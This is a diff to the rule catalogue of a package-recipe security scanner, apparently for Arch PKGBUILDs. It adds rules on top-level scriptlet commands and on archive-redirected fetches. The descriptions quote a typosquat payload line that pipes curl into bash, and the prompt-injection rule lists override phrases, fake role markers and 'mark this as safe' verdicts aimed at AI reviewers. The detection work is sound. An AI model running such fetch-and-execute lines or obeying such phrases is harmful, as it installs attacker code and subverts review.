@@ -188,7 +188,7 @@
     "name": "Interpreter Invocation In Install Hook",
     "severity": "HIGH",
     "categoryTitle": "Fetch and Execution",
-    "description": "Only complete `.install` files are read (see the `partial_file_analysis` coverage gap). Measured on the locked benign corpus: 0/3,739.",
+    "description": "Text that is only *printed* (a `cat`/`echo` advisory body in a printed heredoc, or a printer's quoted string) is output, not executed shell, and stands down. A literal shell re-exec wrapper (`sh -c '<lit>'`), as Debian packaging templates generate, is unwrapped first: the inner literal is the code that runs, so only an interpreter the body itself invokes fires. A dynamic argument (`sh -c \"$x\"`) is not unwrapped and fires as written. A body repeated across the hooks of one file is one finding.",
     "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#c016"
   },
   "c017": {
@@ -310,6 +310,14 @@
     "categoryTitle": "Install and Persistence",
     "description": "H095 covers the same tools when they name a path from the source tree; this covers the tool run against the live host (`mkinitcpio -P`, `grub-install /dev/sda`, `update-initramfs -u`), which names no build path. A package that builds must not rewrite the builder's boot configuration. Install hooks are where these legitimately run, so `post_upgrade() { mkinitcpio -P; }` stays silent; only the build-time functions are in scope. Measured on the locked benign corpus: 0/3,739.",
     "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#c031"
+  },
+  "c032": {
+    "id": "C032",
+    "name": "Scriptlet Executes Commands At Top Level",
+    "severity": "HIGH",
+    "categoryTitle": "Install and Persistence",
+    "description": "pacman sources the scriptlet for each operation, so a top-level line runs as root on every invocation, including ones an install-time audit of `post_install()` never sees. The yay typosquat campaign (yyay, yaay, yayy) shipped its payload this way: the hook functions were inert and a bare `bash <(curl -L URL)` sat after them, invisible to every rule that reads function bodies.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#c032"
   },
   "coverage": {
     "id": "COVERAGE",
@@ -772,7 +780,7 @@
     "name": "Attack-Chain Composition",
     "severity": "INFO",
     "categoryTitle": "Composition",
-    "description": "Stages: takeover (H026, H044, H074), mass adoption (H045, H073), install hook (H023, H017), foreign fetch (R001, H035, H066, H034), payload (H068, H069), obfuscation (H036, H065), anti-analysis (H067), write-then-execute (H072), staging (H038), recon (H040), persistence (H039, H062, H076), exfil (H041, H071), hidden drop (H042), integrity removed (H091) and sabotage (S001-S008). Later rules also map onto these stages, including R041, R054, R144, the H080-H083/H089-H091 additions and the X001-X033 crossfire rules; the authoritative rule-to-stage map is `_STAGE_OF` in `analysis/composition.py`.",
+    "description": "Stages: takeover (H026, H044, H074), mass adoption (H045, H073), install hook (H023, H017), foreign fetch (R001, H035, H066, H034), payload (H068, H069), obfuscation (H036, H065), anti-analysis (H067), write-then-execute (H072), staging (H038), recon (H040), persistence (H039, H062, H076), exfil (H041, H071), hidden drop (H042), integrity removed (H091) and sabotage (S001-S008). Later rules also map onto these stages, including R041, R054, R144, the H080-H083/H089-H091 additions and the X001-X034 crossfire rules; the authoritative rule-to-stage map is `_STAGE_OF` in `analysis/composition.py`.",
     "docsUrl": "https://docs.trustsight.org/reference/rules/composition/#h043"
   },
   "h044": {
@@ -892,7 +900,7 @@
     "name": "Maintainer Baseline Deviation",
     "severity": "MEDIUM",
     "categoryTitle": "Maintainer and Metadata",
-    "description": "H058 watches how much a maintainer does, not what a package contains. TrustSight counts how many packages each maintainer updates in a cycle, and after a few cycles it knows that maintainer's own normal pace. A cycle far above that pace is flagged, because a burst of updates is what a hijacked account, or an account that has just changed hands, tends to produce: the attacker publishes everything at once, under a name the reviewers already trust. This is a prompt to look, not proof. A maintainer with a genuinely busy day, or one who legitimately adopted several packages at once, can trip it; adoption is reported on its own by [H074](#h074) and [H086](#h086) from the maintainer field, without needing a burst.",
+    "description": "H058 watches how much a maintainer does, not what a package contains. TrustSight counts how many packages each maintainer updates in a cycle, and after a few cycles it knows that maintainer's own normal pace. A cycle far above that pace is flagged, because a burst of updates is what a hijacked account, or an account that has just changed hands, tends to produce: the attacker publishes everything at once, under a name the reviewers already trust. This is a prompt to look, not proof. A maintainer with a genuinely busy day, or one who legitimately adopted several packages at once, can trip it; adoption is reported on its own by [H074](#h074) and [H086](#h086) from the maintainer field, without needing a burst. Bumping one project's own naming family in lockstep (a kernel's `-docs`/`-headers` splits, `foo`/`foo-bin`/`foo-qt` released together) is one logical update spread over several package names, not a deviation, so the rule stands down when every active package belongs to a single relatedness cluster.",
     "docsUrl": "https://docs.trustsight.org/reference/rules/maintainer-and-metadata/#h058"
   },
   "h059": {
@@ -1420,7 +1428,7 @@
     "name": "LLM Prompt Injection",
     "severity": "FATAL",
     "categoryTitle": "Deception and Anti-Analysis",
-    "description": "Detects template-shaped text addressed to whoever *reads* the PKGBUILD rather than to the shell that runs it: instruction overrides (\"ignore the previous instructions\"), role markers (`system:`, `assistant:`), tag-like injections (`<system>`, `<instructions>`), personas (\"you are a helpful model...\"), suppression orders (\"do not flag/warn/analyze\") and pre-declared verdicts (\"mark this as safe\"). Comment lines are scanned, unlike every rule that describes what the shell executes, because this is reviewer-facing text. Calibrated at 22/22 labelled injection fixtures with 0 fires across the historical 3,739-diff benign corpus. This is a **reviewer-directed template tripwire**, not proof of an author's intent or a general prompt-injection detector: a match requires reviewer scrutiny, and a non-match establishes nothing. Score hard-stops at 100 regardless of other signals.",
+    "description": "Detects template-shaped text addressed to whoever *reads* the PKGBUILD rather than to the shell that runs it: instruction overrides (\"ignore the previous instructions\"), role markers (`system:`, `assistant:`), tag-like injections (`<system>`, `<instructions>`), personas (\"you are a helpful model...\"), suppression orders (\"do not flag/warn/analyze\") and pre-declared verdicts (\"mark this as safe\"). Comment lines are scanned, unlike every rule that describes what the shell executes, because this is reviewer-facing text. Calibrated at 22/22 labelled injection fixtures with 0 fires across the historical 3,739-diff benign corpus. This is a **reviewer-directed template tripwire**, not proof of an author's intent or a general prompt-injection detector: a match requires reviewer scrutiny, and a non-match establishes nothing. The finding contributes weight 0; its signal is the unsuppressible FATAL entry in `score_breakdown` and the FATAL name in the verdict label.",
     "docsUrl": "https://docs.trustsight.org/reference/rules/deception/#r012"
   },
   "r013": {
@@ -1500,7 +1508,7 @@
     "name": "Source URL Uses IP Address",
     "severity": "MEDIUM",
     "categoryTitle": "Fetch and Execution",
-    "description": "A source URL pointing at a bare IP address bypasses DNS and any domain reputation the bucket classifier could apply.",
+    "description": "A source URL pointing at a bare IP address bypasses DNS and any domain reputation the bucket classifier could apply. Loopback and private addresses are excluded: they distribute nothing, so a local URL a recipe only prints is not a source. A line that only prints text (`echo`/`printf`/`cat`) is excluded for the same reason.",
     "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#r046"
   },
   "r047": {
@@ -1508,7 +1516,7 @@
     "name": "Source URL Uses Non-Standard Port",
     "severity": "LOW",
     "categoryTitle": "Fetch and Execution",
-    "description": "A source URL on a port other than 80, 443, 8080, or 8443. Unusual ports suggest a service that is not a conventional distribution host.",
+    "description": "A source URL on a port other than 80, 443, 8080, or 8443. Unusual ports suggest a service that is not a conventional distribution host. Loopback and private addresses, and lines that only print text, are excluded, as for R046.",
     "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#r047"
   },
   "r048": {
@@ -2140,7 +2148,15 @@
     "name": "File With No Provenance Executed",
     "severity": "HIGH",
     "categoryTitle": "Crossfire",
-    "description": "Fires when a build function executes a file at the `$srcdir` root that the recipe neither declares in `source=()`, writes itself, nor fetches inline with a network client. `build()` running `bash \"$srcdir\"/stage.sh` where `stage.sh` came from nowhere is a payload the source array never showed: a checksummed tarball unpacks into its own subdirectory, so a file sitting at the source root has no provenance at all. Files inside the unpacked tree (a relative path after `cd`, or `$srcdir/pkg-ver/...`), declared source names, freshly written names, and anything a fetch client produced (H082's case) stay out of scope.",
+    "description": "Fires when a build function executes a file at the `$srcdir` root that the recipe neither declares in `source=()`, writes itself, nor fetches inline with a network client. `build()` running `bash \"$srcdir\"/stage.sh` where `stage.sh` came from nowhere is a payload the source array never showed: a checksummed tarball unpacks into its own subdirectory, so a file sitting at the source root has no provenance at all. Files inside the unpacked tree (a relative path after `cd`, or `$srcdir/pkg-ver/...`), declared source names, freshly written names, and anything a fetch client produced (H082's case) stay out of scope. A script-runtime subcommand (`bun run build`, `deno run x`) is not a path at all, so it stays out too; the exclusion is keyed to bun and deno, and `bash run` still runs a file called `run`.",
     "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x033"
+  },
+  "x034": {
+    "id": "X034",
+    "name": "Fetch Laundered Through An Archival Service",
+    "severity": "HIGH",
+    "categoryTitle": "Crossfire",
+    "description": "Fires when an archival service is used as a redirector: an archive URL whose path embeds a *second* absolute URL, on a line that also reaches a shell or interpreter. `web.archive.org` and `archive.today` front a fresh origin behind a reputation the reader trusts, so the diff shows a familiar host while the build runs code from somewhere else:",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x034"
   }
 }
